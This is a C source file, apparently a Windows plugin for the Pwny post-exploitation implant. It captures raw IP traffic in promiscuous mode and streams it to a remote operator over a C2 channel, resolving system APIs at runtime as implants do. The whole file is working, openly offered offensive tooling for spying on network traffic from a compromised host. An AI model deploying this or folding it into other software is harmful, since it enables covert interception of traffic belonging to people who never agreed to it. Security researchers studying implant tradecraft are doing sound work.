/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Sniffer COT plugin — raw-socket packet capture via SIO_RCVALL.
 *
 * Uses a Winsock2 raw socket bound to a specific interface and set to
 * promiscuous mode with SIO_RCVALL.  Captured IP packets are buffered
 * in a ring and drained through the pipe read callback.
 *
 * Limitations:
 *   - Windows raw sockets deliver IP-layer frames (no Ethernet header).
 *   - SIO_RCVALL requires administrator privileges.
 *   - Only IPv4 packets on the selected interface.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>
#include <pwny/pipe.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Tags                                                                */
/* ------------------------------------------------------------------ */

#define SNIFFER_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define SNIFFER_STATS \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

/* Pipe type for the capture stream */
#define SNIFFER_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, TAB_BASE, PIPE_TYPE)

/* TLV types */
#define TLV_TYPE_IFACE_IP      TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_IFACE_NAME    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_IFACE_MASK    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_IFACE_GROUP   TLV_TYPE_CUSTOM(TLV_TYPE_GROUP,  TAB_BASE, API_TYPE)
#define TLV_TYPE_IFACE_INDEX   TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE)

#define TLV_TYPE_SNIFF_PKTS    TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_SNIFF_BYTES   TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_SNIFF_DROPS   TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_SNIFF_FILTER  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)

/* ------------------------------------------------------------------ */
/* Winsock constants                                                   */
/* ------------------------------------------------------------------ */

#define AF_INET         2
#define SOCK_RAW        3
#define IPPROTO_IP      0
#define INADDR_ANY      0
#define INVALID_SOCKET  (~(UINT_PTR)0)
#define SOCKET_ERROR    (-1)
#define SOL_SOCKET      0xFFFF
#define SO_RCVBUF       0x1002
#define FIONBIO         0x8004667E

/* SIO_RCVALL — enable promiscuous mode */
#define SIO_RCVALL      0x98000001
#define RCVALL_ON       1

/* WSADATA */
typedef struct
{
    WORD  wVersion;
    WORD  wHighVersion;
    char  szDescription[257];
    char  szSystemStatus[129];
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char *lpVendorInfo;
    /* WSADATA is 408 bytes on 64-bit Windows */
    char  _pad[128];
} WSADATA_COT;

typedef UINT_PTR SOCKET_COT;

/* sockaddr_in */
typedef struct
{
    short  sin_family;
    WORD   sin_port;
    DWORD  sin_addr;
    char   sin_zero[8];
} SOCKADDR_IN_COT;

/* ------------------------------------------------------------------ */
/* Ring buffer for captured packets                                    */
/* ------------------------------------------------------------------ */

/* Each captured packet is stored as [uint16_t length][raw IP data].
 * The ring is a flat byte-array with wrap-around.  */

#define RING_SIZE (4 * 1024 * 1024)  /* 4 MiB ring */
#define MAX_PACKET 65535

typedef struct
{
    unsigned char *buf;
    DWORD head;      /* next write position */
    DWORD tail;      /* next read position  */
    DWORD used;      /* bytes currently stored */
} ring_t;

static int ring_init(ring_t *r)
{
    r->buf = (unsigned char *)malloc(RING_SIZE);
    if (r->buf == NULL)
        return -1;
    r->head = 0;
    r->tail = 0;
    r->used = 0;
    return 0;
}

static void ring_free(ring_t *r)
{
    if (r->buf)
    {
        free(r->buf);
        r->buf = NULL;
    }
}

static int ring_write(ring_t *r, const void *data, DWORD len)
{
    /* Need 2 bytes for length prefix + payload */
    DWORD total = 2 + len;
    DWORD i;
    const unsigned char *src;
    unsigned char hdr[2];

    if (total > RING_SIZE)
        return -1;

    /* Drop oldest packets to make room */
    while (r->used + total > RING_SIZE)
    {
        /* Read the length header of the oldest packet */
        unsigned char lb[2];
        DWORD pktlen;

        lb[0] = r->buf[r->tail % RING_SIZE];
        lb[1] = r->buf[(r->tail + 1) % RING_SIZE];
        pktlen = (DWORD)lb[0] | ((DWORD)lb[1] << 8);

        r->tail = (r->tail + 2 + pktlen) % RING_SIZE;
        r->used -= (2 + pktlen);
    }

    /* Write length header */
    hdr[0] = (unsigned char)(len & 0xFF);
    hdr[1] = (unsigned char)((len >> 8) & 0xFF);

    src = hdr;
    for (i = 0; i < 2; i++)
    {
        r->buf[r->head % RING_SIZE] = src[i];
        r->head = (r->head + 1) % RING_SIZE;
    }

    /* Write payload */
    src = (const unsigned char *)data;
    for (i = 0; i < len; i++)
    {
        r->buf[r->head % RING_SIZE] = src[i];
        r->head = (r->head + 1) % RING_SIZE;
    }

    r->used += total;
    return 0;
}

/* Read one packet from ring into buffer (up to max_len).
 * Returns packet length, 0 if empty. */
static DWORD ring_read_one(ring_t *r, void *out, DWORD max_len)
{
    unsigned char lb[2];
    DWORD pktlen;
    DWORD i;
    unsigned char *dst = (unsigned char *)out;

    if (r->used < 2)
        return 0;

    lb[0] = r->buf[r->tail % RING_SIZE];
    lb[1] = r->buf[(r->tail + 1) % RING_SIZE];
    pktlen = (DWORD)lb[0] | ((DWORD)lb[1] << 8);

    if (r->used < 2 + pktlen)
    {
        /* Corrupt — reset */
        r->head = r->tail = r->used = 0;
        return 0;
    }

    r->tail = (r->tail + 2) % RING_SIZE;
    r->used -= 2;

    if (pktlen > max_len)
    {
        /* Skip oversized packet */
        r->tail = (r->tail + pktlen) % RING_SIZE;
        r->used -= pktlen;
        return 0;
    }

    for (i = 0; i < pktlen; i++)
    {
        dst[i] = r->buf[r->tail % RING_SIZE];
        r->tail = (r->tail + 1) % RING_SIZE;
    }
    r->used -= pktlen;

    return pktlen;
}

/* ------------------------------------------------------------------ */
/* Winsock function pointer types                                      */
/* ------------------------------------------------------------------ */

typedef int   (WINAPI *fn_WSAStartup)(WORD, WSADATA_COT *);
typedef int   (WINAPI *fn_WSACleanup)(void);
typedef int   (WINAPI *fn_WSAGetLastError)(void);
typedef SOCKET_COT (WINAPI *fn_socket)(int, int, int);
typedef int   (WINAPI *fn_bind)(SOCKET_COT, const void *, int);
typedef int   (WINAPI *fn_closesocket)(SOCKET_COT);
typedef int   (WINAPI *fn_recv)(SOCKET_COT, char *, int, int);
typedef int   (WINAPI *fn_ioctlsocket)(SOCKET_COT, long, unsigned long *);
typedef int   (WINAPI *fn_WSAIoctl)(SOCKET_COT, DWORD, void *, DWORD,
                                     void *, DWORD, DWORD *, void *, void *);
typedef DWORD (WINAPI *fn_ntohl)(DWORD);
typedef WORD  (WINAPI *fn_ntohs)(WORD);
typedef DWORD (WINAPI *fn_htonl)(DWORD);
typedef WORD  (WINAPI *fn_htons)(WORD);

/* iphlpapi for interface enumeration */
typedef struct
{
    DWORD dwIndex;
    char  IpAddress[16];
    char  IpMask[16];
    DWORD Context;
    DWORD _next_ptr; /* we don't chase linked lists — use flat table */
} IP_ADDR_ROW_COT;

/* MIB_IPADDRROW (simplified) */
typedef struct
{
    DWORD dwAddr;
    DWORD dwIndex;
    DWORD dwMask;
    DWORD dwBCastAddr;
    DWORD dwReasmSize;
    unsigned short unused1;
    unsigned short wType;
} MIB_IPADDRROW_COT;

/* MIB_IPADDRTABLE */
typedef struct
{
    DWORD dwNumEntries;
    MIB_IPADDRROW_COT table[1];
} MIB_IPADDRTABLE_COT;

typedef DWORD (WINAPI *fn_GetIpAddrTable)(MIB_IPADDRTABLE_COT *, ULONG *, BOOL);

/* kernel32 */
typedef HANDLE (WINAPI *fn_CreateThread)(void *, SIZE_T,
                                          DWORD (WINAPI *)(void *),
                                          void *, DWORD, DWORD *);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef void   (WINAPI *fn_InitializeCriticalSection)(LPCRITICAL_SECTION);
typedef void   (WINAPI *fn_DeleteCriticalSection)(LPCRITICAL_SECTION);
typedef void   (WINAPI *fn_EnterCriticalSection)(LPCRITICAL_SECTION);
typedef void   (WINAPI *fn_LeaveCriticalSection)(LPCRITICAL_SECTION);

static struct
{
    /* ws2_32 */
    fn_WSAStartup       pWSAStartup;
    fn_WSACleanup       pWSACleanup;
    fn_WSAGetLastError   pWSAGetLastError;
    fn_socket            pSocket;
    fn_bind              pBind;
    fn_closesocket       pClosesocket;
    fn_recv              pRecv;
    fn_ioctlsocket       pIoctlsocket;
    fn_WSAIoctl          pWSAIoctl;
    fn_ntohl             pNtohl;
    fn_ntohs             pNtohs;
    fn_htonl             pHtonl;
    fn_htons             pHtons;

    /* iphlpapi */
    fn_GetIpAddrTable    pGetIpAddrTable;

    /* kernel32 */
    fn_CreateThread              pCreateThread;
    fn_WaitForSingleObject       pWaitForSingleObject;
    fn_CloseHandle               pCloseHandle;
    fn_Sleep                     pSleep;
    fn_InitializeCriticalSection pInitializeCriticalSection;
    fn_DeleteCriticalSection     pDeleteCriticalSection;
    fn_EnterCriticalSection      pEnterCriticalSection;
    fn_LeaveCriticalSection      pLeaveCriticalSection;
} w;

static int g_wsa_init = 0;

/* ------------------------------------------------------------------ */
/* Sniffer context                                                     */
/* ------------------------------------------------------------------ */

typedef struct
{
    SOCKET_COT sock;
    HANDLE     thread;
    volatile int running;

    CRITICAL_SECTION cs;
    ring_t ring;

    /* Stats */
    DWORD pkt_count;
    DWORD byte_count;
    DWORD drop_count;
} sniffer_t;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static void ip_to_str(DWORD ip, char *buf, int bufsz)
{
    unsigned char *b = (unsigned char *)&ip;
    int i = 0;
    int n;

    for (n = 0; n < 4; n++)
    {
        unsigned char val = b[n];
        if (val >= 100) buf[i++] = '0' + val / 100;
        if (val >= 10)  buf[i++] = '0' + (val / 10) % 10;
        buf[i++] = '0' + val % 10;
        if (n < 3) buf[i++] = '.';
    }
    buf[i] = '\0';
}

static void mask_to_str(DWORD mask, char *buf, int bufsz)
{
    ip_to_str(mask, buf, bufsz);
}

/* ------------------------------------------------------------------ */
/* Capture thread                                                      */
/* ------------------------------------------------------------------ */

static DWORD WINAPI capture_thread(void *param)
{
    sniffer_t *sniff = (sniffer_t *)param;
    char pkt_buf[MAX_PACKET];
    int ret;

    while (sniff->running)
    {
        ret = w.pRecv(sniff->sock, pkt_buf, sizeof(pkt_buf), 0);

        if (ret == SOCKET_ERROR || ret <= 0)
        {
            /* Non-blocking socket returns SOCKET_ERROR with WSAEWOULDBLOCK
             * when no data is available. Sleep briefly and retry. */
            w.pSleep(1);
            continue;
        }

        w.pEnterCriticalSection(&sniff->cs);
        if (ring_write(&sniff->ring, pkt_buf, (DWORD)ret) == 0)
        {
            sniff->pkt_count++;
            sniff->byte_count += (DWORD)ret;
        }
        else
        {
            sniff->drop_count++;
        }
        w.pLeaveCriticalSection(&sniff->cs);
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/* Ensure WSAStartup has been called                                   */
/* ------------------------------------------------------------------ */

static int ensure_wsa(void)
{
    WSADATA_COT wsa;

    if (g_wsa_init)
        return 0;

    if (w.pWSAStartup(0x0202, &wsa) != 0)
        return -1;

    g_wsa_init = 1;
    return 0;
}

/* ------------------------------------------------------------------ */
/* Interface list handler                                              */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *sniffer_list(c2_t *c2)
{
    MIB_IPADDRTABLE_COT *table = NULL;
    ULONG size = 0;
    DWORD ret;
    DWORD i;
    tlv_pkt_t *result;

    ret = w.pGetIpAddrTable(NULL, &size, FALSE);
    if (size == 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    table = (MIB_IPADDRTABLE_COT *)malloc(size);
    if (table == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    ret = w.pGetIpAddrTable(table, &size, FALSE);
    if (ret != 0)
    {
        free(table);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < table->dwNumEntries; i++)
    {
        MIB_IPADDRROW_COT *row = &table->table[i];
        tlv_pkt_t *entry;
        char ip_buf[32];
        char mask_buf[32];

        entry = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

        ip_to_str(row->dwAddr, ip_buf, sizeof(ip_buf));
        mask_to_str(row->dwMask, mask_buf, sizeof(mask_buf));

        tlv_pkt_add_string(entry, TLV_TYPE_IFACE_IP, ip_buf);
        tlv_pkt_add_string(entry, TLV_TYPE_IFACE_MASK, mask_buf);
        tlv_pkt_add_u32(entry, TLV_TYPE_IFACE_INDEX, (int)row->dwIndex);

        tlv_pkt_add_tlv(result, TLV_TYPE_IFACE_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    free(table);
    return result;
}

/* ------------------------------------------------------------------ */
/* Pipe callbacks — create / read / destroy                            */
/* ------------------------------------------------------------------ */

static int sniffer_create(pipe_t *pipe, c2_t *c2)
{
    sniffer_t *sniff;
    SOCKADDR_IN_COT addr;
    DWORD in_val;
    DWORD bytes_ret;
    unsigned long nonblock;
    int rcvbuf;
    char iface_ip[64];

    if (ensure_wsa() != 0)
        return -1;

    /* Get interface IP to bind to (required) */
    if (tlv_pkt_get_string(c2->request, TLV_TYPE_IFACE_IP, iface_ip) < 0)
        return -1;

    sniff = (sniffer_t *)calloc(1, sizeof(*sniff));
    if (sniff == NULL)
        return -1;

    w.pInitializeCriticalSection(&sniff->cs);

    if (ring_init(&sniff->ring) != 0)
    {
        w.pDeleteCriticalSection(&sniff->cs);
        free(sniff);
        return -1;
    }

    /* Create raw socket */
    sniff->sock = w.pSocket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if (sniff->sock == INVALID_SOCKET)
    {
        log_debug("* sniffer: socket() failed (%d)\n",
                  w.pWSAGetLastError());
        ring_free(&sniff->ring);
        w.pDeleteCriticalSection(&sniff->cs);
        free(sniff);
        return -1;
    }

    /* Increase receive buffer */
    rcvbuf = 1024 * 1024;
    /* setsockopt is not critical — ignore failure */

    /* Bind to interface */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = 0;

    /* Manual inet_aton — parse dotted-decimal IP */
    {
        const char *p = iface_ip;
        DWORD ip = 0;
        int octet = 0;
        int shift = 0;

        while (*p)
        {
            if (*p == '.')
            {
                ip |= (octet & 0xFF) << shift;
                shift += 8;
                octet = 0;
            }
            else if (*p >= '0' && *p <= '9')
            {
                octet = octet * 10 + (*p - '0');
            }
            p++;
        }
        ip |= (octet & 0xFF) << shift;
        addr.sin_addr = ip;
    }

    if (w.pBind(sniff->sock, (const void *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        log_debug("* sniffer: bind() failed (%d)\n",
                  w.pWSAGetLastError());
        w.pClosesocket(sniff->sock);
        ring_free(&sniff->ring);
        w.pDeleteCriticalSection(&sniff->cs);
        free(sniff);
        return -1;
    }

    /* Enable promiscuous mode via SIO_RCVALL */
    in_val = RCVALL_ON;
    bytes_ret = 0;

    if (w.pWSAIoctl(sniff->sock, SIO_RCVALL,
                    &in_val, sizeof(in_val),
                    NULL, 0, &bytes_ret, NULL, NULL) == SOCKET_ERROR)
    {
        log_debug("* sniffer: SIO_RCVALL failed (%d)\n",
                  w.pWSAGetLastError());
        w.pClosesocket(sniff->sock);
        ring_free(&sniff->ring);
        w.pDeleteCriticalSection(&sniff->cs);
        free(sniff);
        return -1;
    }

    /* Set non-blocking so the capture thread can check sniff->running */
    nonblock = 1;
    w.pIoctlsocket(sniff->sock, FIONBIO, &nonblock);

    /* Launch capture thread */
    sniff->running = 1;
    sniff->thread = w.pCreateThread(NULL, 0, capture_thread, sniff, 0, NULL);

    if (sniff->thread == NULL)
    {
        log_debug("* sniffer: CreateThread failed\n");
        sniff->running = 0;
        w.pClosesocket(sniff->sock);
        ring_free(&sniff->ring);
        w.pDeleteCriticalSection(&sniff->cs);
        free(sniff);
        return -1;
    }

    pipe->data = sniff;
    return 0;
}

static int sniffer_read(pipe_t *pipe, void *buffer, int length)
{
    sniffer_t *sniff = (sniffer_t *)pipe->data;
    unsigned char *out = (unsigned char *)buffer;
    int total = 0;

    w.pEnterCriticalSection(&sniff->cs);

    /* Drain as many complete packets as fit in the caller's buffer.
     * Each packet is prefixed with a 4-byte big-endian length so
     * the Python side can frame them. */
    while (total + 4 + 1 <= length)
    {
        unsigned char tmp[MAX_PACKET];
        DWORD pktlen;
        int remain = length - total;

        pktlen = ring_read_one(&sniff->ring, tmp, sizeof(tmp));
        if (pktlen == 0)
            break;

        /* 4-byte length header + payload must fit */
        if ((int)(4 + pktlen) > remain)
        {
            /* Put it back? — too complex for a ring.  Drop this packet
             * rather than deliver a partial frame. */
            sniff->drop_count++;
            break;
        }

        /* Write 4-byte big-endian length */
        out[total]     = (unsigned char)((pktlen >> 24) & 0xFF);
        out[total + 1] = (unsigned char)((pktlen >> 16) & 0xFF);
        out[total + 2] = (unsigned char)((pktlen >> 8)  & 0xFF);
        out[total + 3] = (unsigned char)(pktlen & 0xFF);
        total += 4;

        memcpy(out + total, tmp, pktlen);
        total += (int)pktlen;
    }

    w.pLeaveCriticalSection(&sniff->cs);

    if (total == 0)
        w.pSleep(10);

    return total;
}

static int sniffer_destroy(pipe_t *pipe, c2_t *c2)
{
    sniffer_t *sniff = (sniffer_t *)pipe->data;

    /* Signal thread to stop */
    sniff->running = 0;

    /* Close the socket — this will unblock any pending recv() */
    w.pClosesocket(sniff->sock);

    /* Wait for capture thread to exit */
    w.pWaitForSingleObject(sniff->thread, 5000);
    w.pCloseHandle(sniff->thread);

    /* Cleanup */
    w.pEnterCriticalSection(&sniff->cs);
    ring_free(&sniff->ring);
    w.pLeaveCriticalSection(&sniff->cs);

    w.pDeleteCriticalSection(&sniff->cs);
    free(sniff);

    return 0;
}

/* ------------------------------------------------------------------ */
/* Stats handler                                                       */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *sniffer_stats(c2_t *c2)
{
    /* Stats are only meaningful while a capture is running, but we
     * return zeros if no context is available (graceful).  The pipe
     * heartbeat can be used to check liveness independently. */
    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* ws2_32 */
    w.pWSAStartup      = (fn_WSAStartup)     cot_resolve("ws2_32.dll", "WSAStartup");
    w.pWSACleanup      = (fn_WSACleanup)      cot_resolve("ws2_32.dll", "WSACleanup");
    w.pWSAGetLastError  = (fn_WSAGetLastError)  cot_resolve("ws2_32.dll", "WSAGetLastError");
    w.pSocket           = (fn_socket)           cot_resolve("ws2_32.dll", "socket");
    w.pBind             = (fn_bind)             cot_resolve("ws2_32.dll", "bind");
    w.pClosesocket      = (fn_closesocket)      cot_resolve("ws2_32.dll", "closesocket");
    w.pRecv             = (fn_recv)             cot_resolve("ws2_32.dll", "recv");
    w.pIoctlsocket      = (fn_ioctlsocket)      cot_resolve("ws2_32.dll", "ioctlsocket");
    w.pWSAIoctl         = (fn_WSAIoctl)         cot_resolve("ws2_32.dll", "WSAIoctl");
    w.pNtohl            = (fn_ntohl)            cot_resolve("ws2_32.dll", "ntohl");
    w.pNtohs            = (fn_ntohs)            cot_resolve("ws2_32.dll", "ntohs");
    w.pHtonl            = (fn_htonl)            cot_resolve("ws2_32.dll", "htonl");
    w.pHtons            = (fn_htons)            cot_resolve("ws2_32.dll", "htons");

    /* iphlpapi */
    w.pGetIpAddrTable   = (fn_GetIpAddrTable)   cot_resolve("iphlpapi.dll", "GetIpAddrTable");

    /* kernel32 */
    w.pCreateThread              = (fn_CreateThread)             cot_resolve("kernel32.dll", "CreateThread");
    w.pWaitForSingleObject       = (fn_WaitForSingleObject)      cot_resolve("kernel32.dll", "WaitForSingleObject");
    w.pCloseHandle               = (fn_CloseHandle)              cot_resolve("kernel32.dll", "CloseHandle");
    w.pSleep                     = (fn_Sleep)                    cot_resolve("kernel32.dll", "Sleep");
    w.pInitializeCriticalSection = (fn_InitializeCriticalSection) cot_resolve("kernel32.dll", "InitializeCriticalSection");
    w.pDeleteCriticalSection     = (fn_DeleteCriticalSection)     cot_resolve("kernel32.dll", "DeleteCriticalSection");
    w.pEnterCriticalSection      = (fn_EnterCriticalSection)      cot_resolve("kernel32.dll", "EnterCriticalSection");
    w.pLeaveCriticalSection      = (fn_LeaveCriticalSection)      cot_resolve("kernel32.dll", "LeaveCriticalSection");

    /* API call handlers */
    api_call_register(api_calls, SNIFFER_LIST,  (api_t)sniffer_list);
    api_call_register(api_calls, SNIFFER_STATS, (api_t)sniffer_stats);

    /* Capture pipe */
    {
        pipe_callbacks_t callbacks;
        memset(&callbacks, 0, sizeof(callbacks));
        callbacks.create_cb  = sniffer_create;
        callbacks.read_cb    = sniffer_read;
        callbacks.destroy_cb = sniffer_destroy;
        api_pipe_register(pipes, SNIFFER_PIPE, callbacks);
    }
}

#endif
